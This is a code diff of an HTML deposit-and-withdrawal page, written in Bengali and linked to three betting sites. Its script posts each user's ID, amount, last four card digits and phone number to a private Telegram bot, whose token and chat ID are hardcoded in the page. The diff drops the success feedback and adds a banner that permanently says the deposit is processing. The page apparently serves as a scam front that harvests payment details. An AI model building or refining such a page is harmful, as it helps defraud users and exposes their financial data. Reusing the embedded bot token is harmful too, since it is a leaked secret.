@@ -11,7 +11,7 @@
 
 html,body{
   height:100%;
-  overflow-x:hidden;
+  overflow-x:hidden; /* FIX OUTSIDE SCROLL */
 }
 
 body{
@@ -29,20 +29,26 @@ body{
   padding:15px;
   padding-top:25px;
   padding-bottom:120px;
+  overflow:hidden; /* EXTRA SAFETY */
 }
 
-/* TOP BUTTON LINKS (REPLACED SLIDER) */
-.link-btn{
-  display:block;
-  text-align:center;
-  padding:10px;
-  margin-bottom:6px;
+/* TOP SLIDER (UNCHANGED AS YOU SAID) */
+.top-note{
+  overflow:hidden;
+  background: rgba(14,165,233,0.15);
   border-radius:12px;
-  background:rgba(14,165,233,0.15);
-  border:1px solid rgba(14,165,233,0.25);
-  color:white;
-  text-decoration:none;
-  font-weight:500;
+  margin-bottom:8px;
+}
+.top-note span{
+  display:inline-block;
+  padding:10px;
+  white-space:nowrap;
+  animation:slide 10s linear infinite;
+}
+
+@keyframes slide{
+  0%{transform:translateX(100%);}
+  100%{transform:translateX(-100%);}
 }
 
 /* TABS */
@@ -90,13 +96,16 @@ body{
 }
 .method.active{border:1px solid #0ea5e9;}
 
-/* INPUT */
+/* INPUT FIX (NO OUTSIDE FLOW) */
 .row{
   display:flex;
   gap:8px;
+  flex-wrap:wrap; /* IMPORTANT FIX */
 }
 .row input{
   flex:1;
+  min-width:0;
+  width:100%;
   padding:14px;
   border-radius:16px;
   background:linear-gradient(145deg,#0f172a,#020617);
@@ -116,7 +125,7 @@ body{
   font-weight:600;
 }
 
-/* FLOAT */
+/* FLOAT AREA */
 .float-area{
   position:fixed;
   bottom:110px;
@@ -139,22 +148,30 @@ body{
   align-items:center;
 }
 
-/* LOADER */
-.loader{
-  display:none;
-  text-align:center;
-  margin-top:10px;
+/* BOTTOM BUTTONS (REPLACE SLIDER AREA) */
+.bottom-links{
+  position:fixed;
+  bottom:20px;
+  left:50%;
+  transform:translateX(-50%);
+  width:calc(100% - 30px);
+  max-width:380px;
+  display:flex;
+  gap:6px;
+  justify-content:space-between;
 }
 
-/* SUCCESS */
-.success-box{
-  display:none;
-  margin-top:12px;
-  padding:12px;
-  border-radius:14px;
-  background:rgba(14,165,233,0.15);
-  border:1px solid #0ea5e9;
+.bottom-links a{
+  flex:1;
+  text-decoration:none;
   text-align:center;
+  padding:10px 6px;
+  border-radius:12px;
+  background:rgba(14,165,233,0.15);
+  border:1px solid rgba(14,165,233,0.25);
+  color:white;
+  font-size:12px;
+  white-space:nowrap;
 }
 </style>
 </head>
@@ -163,10 +180,10 @@ body{
 
 <div class="container">
 
-<!-- LINKS -->
-<a class="link-btn" href="https://bjwala.co" target="_blank">Bjwala.co</a>
-<a class="link-btn" href="https://9xbet9.live" target="_blank">9xbet9.live</a>
-<a class="link-btn" href="https://velki247.live" target="_blank">Velki247.live</a>
+<!-- TOP SLIDER (UNCHANGED) -->
+<div class="top-note">
+  <span>⏳ অনুগ্রহ করে অপেক্ষা করুন, আপনার ডিপোজিট প্রক্রিয়াধীন...</span>
+</div>
 
 <div class="tabs">
   <div class="tab active" onclick="showTab('deposit', event)">Deposit</div>
@@ -189,8 +206,6 @@ body{
   </div>
 
   <button class="btn" onclick="sendDeposit()">সাবমিট</button>
-  <div class="loader" id="loader">⏳ Processing...</div>
-  <div class="success-box" id="success1"></div>
 </div>
 
 <!-- WITHDRAW -->
@@ -209,8 +224,6 @@ body{
   </div>
 
   <button class="btn" onclick="sendWithdraw()">সাবমিট</button>
-  <div class="loader" id="loader2">⏳ Processing...</div>
-  <div class="success-box" id="success2"></div>
 </div>
 
 </div>
@@ -226,6 +239,13 @@ body{
   </a>
 </div>
 
+<!-- BOTTOM LINKS (NEW) -->
+<div class="bottom-links">
+  <a href="https://bjwala.co" target="_blank">Bjwala</a>
+  <a href="https://9xbet9.live" target="_blank">9xbet</a>
+  <a href="https://velki247.live" target="_blank">Velki</a>
+</div>
+
 <script>
 const botToken = "8216213984:AAFCOQsGouXgnit2vKWR6Rv8-VonSYL7_irk";
 const chatId = "8406979793";
@@ -238,7 +258,7 @@ function generateOrderId(){
   return "#" + (orderCounter++);
 }
 
-/* RESET INPUTS */
+/* RESET */
 function resetDeposit(){
   d_userid.value="";
   d_amount.value="";
@@ -253,53 +273,34 @@ function resetWithdraw(){
 
 /* DEPOSIT */
 function sendDeposit(){
-  loader.style.display="block";
+  let id = generateOrderId();
 
-  setTimeout(()=>{
-    let id = generateOrderId();
+  let msg = `📥 Deposit
+🆔 ${id}
+💳 ${selectedDeposit}
+👤 ${d_userid.value}
+💰 ${d_amount.value}
+🔢 ${d_last.value}`;
 
-    let msg = `📥 Deposit Request
-🆔 Order ID: ${id}
-💳 Method: ${selectedDeposit}
-👤 User ID: ${d_userid.value}
-💰 Amount: ${d_amount.value}
-🔢 Last 4 Digit: ${d_last.value}`;
-
-    sendToTelegram(msg);
-
-    success1.innerHTML = `✅ সফল হয়েছে<br>Order ID: ${id}`;
-    success1.style.display="block";
-    loader.style.display="none";
-
-    resetDeposit(); // ✅ RESET
-  },1500);
+  sendToTelegram(msg);
+  resetDeposit();
 }
 
 /* WITHDRAW */
 function sendWithdraw(){
-  loader2.style.display="block";
+  let id = generateOrderId();
 
-  setTimeout(()=>{
-    let id = generateOrderId();
+  let msg = `📤 Withdraw
+🆔 ${id}
+💳 ${selectedWithdraw}
+👤 ${w_userid.value}
+💰 ${w_amount.value}
+📱 ${w_number.value}`;
 
-    let msg = `📤 Withdraw Request
-🆔 Order ID: ${id}
-💳 Method: ${selectedWithdraw}
-👤 User ID: ${w_userid.value}
-💰 Amount: ${w_amount.value}
-📱 Number: ${w_number.value}`;
-
-    sendToTelegram(msg);
-
-    success2.innerHTML = `✅ সফল হয়েছে<br>Order ID: ${id}`;
-    success2.style.display="block";
-    loader2.style.display="none";
-
-    resetWithdraw(); // ✅ RESET
-  },1500);
+  sendToTelegram(msg);
+  resetWithdraw();
 }
 
-/* TELEGRAM */
 function sendToTelegram(message){
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
     method:"POST",
@@ -308,27 +309,19 @@ function sendToTelegram(message){
   });
 }
 
-/* METHOD SELECT */
 function selectMethod(el,type){
   let parent = type==='deposit'?depositMethods:withdrawMethods;
   parent.querySelectorAll('.method').forEach(m=>m.classList.remove('active'));
   el.classList.add('active');
 
-  if(type==='deposit'){
-    selectedDeposit = el.innerText;
-  }else{
-    selectedWithdraw = el.innerText;
-  }
+  if(type==='deposit') selectedDeposit = el.innerText;
+  else selectedWithdraw = el.innerText;
 }
 
-/* TAB */
 function showTab(tab,e){
   deposit.style.display='none';
   withdraw.style.display='none';
   document.getElementById(tab).style.display='block';
-
-  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
-  e.target.classList.add('active');
 }
 </script>
 
